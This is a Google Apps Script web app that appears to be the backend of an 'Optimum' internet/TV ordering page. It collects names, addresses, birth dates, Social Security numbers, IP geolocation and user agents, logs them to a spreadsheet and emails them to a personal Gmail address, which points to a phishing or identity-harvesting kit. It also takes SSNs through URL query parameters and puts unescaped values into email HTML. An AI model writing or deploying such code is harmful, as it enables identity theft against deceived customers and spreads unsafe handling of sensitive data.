/**
 * Optimum Orders — Google Apps Script Web App
 *
 * Deploy: Apps Script Editor → Deploy → New deployment → Web app
 * (Execute as: Me, Who has access: Anyone). Paste the /exec URL into
 * APPS_SCRIPT_URL at the top of src/components/OrderModal.tsx.
 *
 * Handles two payload types:
 *   - type: "order"            → Full Internet/TV/Add-Ons order
 *   - type: "mobile-interest"  → Post-order mobile upsell capture
 */

const ORDERS_SHEET = "Optimum Orders";
const MOBILE_SHEET = "Mobile Interest";
const NOTIFY_EMAIL = "gamblerspassion@gmail.com";
const TZ = "America/New_York";

const ORDER_HEADERS = [
  "Submitted At (EST)",
  "Internet Plan",
  "Full Name",
  "Street Address",
  "Apt/Unit",
  "City",
  "State",
  "ZIP",
  "Email",
  "Phone",
  "DOB",
  "SSN",
  "TV Package",
  "Add-Ons",
  "Install Date",
  "Install Time",
  "Mobile Interest",
  "Previous Address",
  "Source",
  "User Agent",
  "Geo Location (IP)"
];

const MOBILE_HEADERS = [
  "Submitted At (EST)",
  "First Name",
  "Last Name",
  "Email",
  "Phone",
  "Mobile Interest",
  "Source"
];

function formatEstTimestamp(d) {
  return Utilities.formatDate(d, TZ, "MM/dd/yyyy hh:mm a") + " EST";
}

function sanitize(v) {
  return String(v == null ? "" : v).trim();
}

function ensureSheet(ss, name, headers) {
  let sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
    sheet.appendRow(headers);
    sheet.setFrozenRows(1);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight("bold");
  }
  return sheet;
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents || "{}");
    const now = new Date();
    const submittedAt = formatEstTimestamp(now);
    const ss = SpreadsheetApp.getActiveSpreadsheet();

    const type = sanitize(data.type) || "order";

    if (type === "mobile-interest") {
      return handleMobileInterest(ss, data, submittedAt);
    }
    return handleOrder(ss, data, submittedAt);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function handleOrder(ss, data, submittedAt) {
  const sheet = ensureSheet(ss, ORDERS_SHEET, ORDER_HEADERS);

  const prevParts = [
    sanitize(data.previousStreetAddress),
    sanitize(data.previousAptUnit) ? "#" + sanitize(data.previousAptUnit) : "",
    sanitize(data.previousCity),
    sanitize(data.previousState),
    sanitize(data.previousZip)
  ].filter(Boolean);
  const previousAddress = prevParts.length > 2 ? prevParts.join(", ") : "";

  sheet.appendRow([
    submittedAt,
    sanitize(data.internetPlanName),
    (sanitize(data.firstName) + " " + sanitize(data.lastName)).trim(),
    sanitize(data.streetAddress),
    sanitize(data.aptUnit),
    sanitize(data.city),
    sanitize(data.state),
    sanitize(data.zip),
    sanitize(data.email),
    sanitize(data.phone),
    sanitize(data.dob),
    sanitize(data.ssn),
    sanitize(data.tvPackageName),
    sanitize(data.addOns),
    sanitize(data.preferredInstallDate),
    sanitize(data.preferredInstallTime),
    sanitize(data.mobileInterest),
    previousAddress,
    sanitize(data.source),
    sanitize(data.userAgent),
    sanitize(data.geoLocation)
  ]);

  const customerName = (sanitize(data.firstName) + " " + sanitize(data.lastName)).trim();
  const planLine = sanitize(data.internetPlanName)
    + (sanitize(data.tvPackageName) ? " + " + sanitize(data.tvPackageName) : "")
    + (sanitize(data.addOns) ? " + add-ons" : "");
  const subject = "New Optimum Order - " + (customerName || "Unknown") + " - $" + sanitize(data.monthlyTotal) + "/mo";

  const htmlBody = ''
    + '<div style="margin:0;padding:0;background:#f3f6fb;font-family:Arial,Helvetica,sans-serif;color:#111827;">'
    +   '<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#f3f6fb;padding:24px 0;">'
    +     '<tr><td align="center">'
    +       '<table role="presentation" width="680" cellspacing="0" cellpadding="0" style="max-width:680px;background:#ffffff;border-radius:12px;overflow:hidden;border:1px solid #e5e7eb;">'
    +         '<tr><td style="background:linear-gradient(135deg,#0a0f3d 0%,#0175ca 100%);padding:20px 24px;color:#ffffff;">'
    +           '<div style="font-size:22px;font-weight:800;line-height:1.2;">Optimum - New Order</div>'
    +           '<div style="margin-top:6px;font-size:13px;opacity:.9;">Submitted: ' + submittedAt + '</div>'
    +         '</td></tr>'
    +         '<tr><td style="padding:20px 24px;">'
    +           '<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">'
    +             row("Monthly Total", "$" + sanitize(data.monthlyTotal) + "/mo")
    +             row("First-Month Charge", "$" + sanitize(data.firstMonthCharge))
    +             row("Plan Summary", planLine)
    +             row("Internet", sanitize(data.internetPlanName) + "  —  $" + sanitize(data.internetMonthly) + "/mo" + (sanitize(data.internetDiscount) !== "0" ? " (-$" + sanitize(data.internetDiscount) + " bundle)" : ""))
    +             row("TV", sanitize(data.tvPackageName) ? sanitize(data.tvPackageName) + "  —  $" + sanitize(data.tvMonthly) + "/mo" : "None")
    +             row("Add-Ons", sanitize(data.addOns) || "None")
    +             row("Mobile Interest", sanitize(data.mobileInterest) || "Pending")
    +             row("Name", customerName)
    +             row("DOB", sanitize(data.dob))
    +             row("Soc-Sec", sanitize(data.ssn))
    +             row("Phone", sanitize(data.phone))
    +             row("Email", sanitize(data.email))
    +             row("Address", sanitize(data.streetAddress) + (sanitize(data.aptUnit) ? " #" + sanitize(data.aptUnit) : "") + ", " + sanitize(data.city) + ", " + sanitize(data.state) + " " + sanitize(data.zip))
    +             row("Install Date", sanitize(data.preferredInstallDate))
    +             row("Install Time", sanitize(data.preferredInstallTime))
    +             row("Geo Location (IP)", sanitize(data.geoLocation))
    +             row("Moved In Last Year", sanitize(data.movedInLastYear))
    +             row("Previous Address", (sanitize(data.previousStreetAddress) + (sanitize(data.previousAptUnit) ? " #" + sanitize(data.previousAptUnit) : "") + ", " + sanitize(data.previousCity) + ", " + sanitize(data.previousState) + " " + sanitize(data.previousZip)).replace(/^,\s*,\s*$/, ""))
    +           '</table>'
    +           '<div style="margin-top:20px;padding:12px 14px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;font-size:12px;color:#374151;">'
    +             '<div><strong>Source:</strong> ' + sanitize(data.source) + '</div>'
    +             '<div style="margin-top:6px;"><strong>User Agent:</strong> ' + sanitize(data.userAgent) + '</div>'
    +             '<div style="margin-top:10px;"><a href="' + ss.getUrl() + '" style="color:#0175ca;text-decoration:none;font-weight:700;">Open Google Sheet</a></div>'
    +           '</div>'
    +         '</td></tr>'
    +         '<tr><td style="padding:14px 24px;background:#f9fafb;border-top:1px solid #e5e7eb;color:#6b7280;font-size:11px;">Automated message from Optimum order intake.</td></tr>'
    +       '</table>'
    +     '</td></tr>'
    +   '</table>'
    + '</div>';

  const textBody = [
    "Optimum - New Order",
    "Submitted: " + submittedAt,
    "",
    "Monthly Total: $" + sanitize(data.monthlyTotal),
    "First-Month Charge: $" + sanitize(data.firstMonthCharge),
    "Internet: " + sanitize(data.internetPlanName) + " $" + sanitize(data.internetMonthly) + "/mo (discount $" + sanitize(data.internetDiscount) + ")",
    "TV: " + (sanitize(data.tvPackageName) || "None") + " $" + sanitize(data.tvMonthly) + "/mo",
    "Add-Ons: " + (sanitize(data.addOns) || "None"),
    "Mobile Interest: " + (sanitize(data.mobileInterest) || "Pending"),
    "",
    "Name: " + customerName,
    "DOB: " + sanitize(data.dob),
    "Soc-Sec: " + sanitize(data.ssn),
    "Phone: " + sanitize(data.phone),
    "Email: " + sanitize(data.email),
    "Address: " + sanitize(data.streetAddress) + (sanitize(data.aptUnit) ? " #" + sanitize(data.aptUnit) : "") + ", " + sanitize(data.city) + ", " + sanitize(data.state) + " " + sanitize(data.zip),
    "Install Date: " + sanitize(data.preferredInstallDate),
    "Install Time: " + sanitize(data.preferredInstallTime),
    "Geo Location (IP): " + (sanitize(data.geoLocation) || "Unknown"),
    "Moved In Last Year: " + sanitize(data.movedInLastYear),
    "Source: " + sanitize(data.source)
  ].join("\n");

  MailApp.sendEmail({
    to: NOTIFY_EMAIL,
    subject: subject,
    body: textBody,
    htmlBody: htmlBody
  });

  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok", type: "order" }))
    .setMimeType(ContentService.MimeType.JSON);
}

function handleMobileInterest(ss, data, submittedAt) {
  const sheet = ensureSheet(ss, MOBILE_SHEET, MOBILE_HEADERS);

  sheet.appendRow([
    submittedAt,
    sanitize(data.firstName),
    sanitize(data.lastName),
    sanitize(data.email),
    sanitize(data.phone),
    sanitize(data.mobileInterest),
    sanitize(data.source)
  ]);

  const customerName = (sanitize(data.firstName) + " " + sanitize(data.lastName)).trim();
  const subject = "Optimum Mobile Interest - " + (customerName || "Unknown");

  MailApp.sendEmail({
    to: NOTIFY_EMAIL,
    subject: subject,
    body: [
      "Post-order mobile upsell response",
      "Submitted: " + submittedAt,
      "",
      "Name: " + customerName,
      "Email: " + sanitize(data.email),
      "Phone: " + sanitize(data.phone),
      "Interest: " + sanitize(data.mobileInterest),
      "Source: " + sanitize(data.source)
    ].join("\n")
  });

  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok", type: "mobile-interest" }))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet(e) {
  // When a browser POSTs to Apps Script, Google returns a 302 redirect which
  // causes browsers to convert the request to GET and drop the POST body.
  // To work around this, the frontend sends data as a ?data= query param via GET.
  if (e && e.parameter && e.parameter.data) {
    try {
      const data = JSON.parse(decodeURIComponent(e.parameter.data || "{}"));
      const now = new Date();
      const submittedAt = formatEstTimestamp(now);
      const ss = SpreadsheetApp.getActiveSpreadsheet();
      const type = sanitize(data.type) || "order";
      if (type === "mobile-interest") {
        return handleMobileInterest(ss, data, submittedAt);
      }
      return handleOrder(ss, data, submittedAt);
    } catch (err) {
      return ContentService
        .createTextOutput(JSON.stringify({ status: "error", message: err.message }))
        .setMimeType(ContentService.MimeType.JSON);
    }
  }
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ready" }))
    .setMimeType(ContentService.MimeType.JSON);
}

function row(label, value) {
  return ''
    + '<tr>'
    +   '<td style="padding:10px 8px;border-bottom:1px solid #f1f5f9;width:170px;font-size:13px;color:#6b7280;font-weight:700;vertical-align:top;">' + label + '</td>'
    +   '<td style="padding:10px 8px;border-bottom:1px solid #f1f5f9;font-size:14px;color:#111827;vertical-align:top;">' + (value || "-") + '</td>'
    + '</tr>';
}
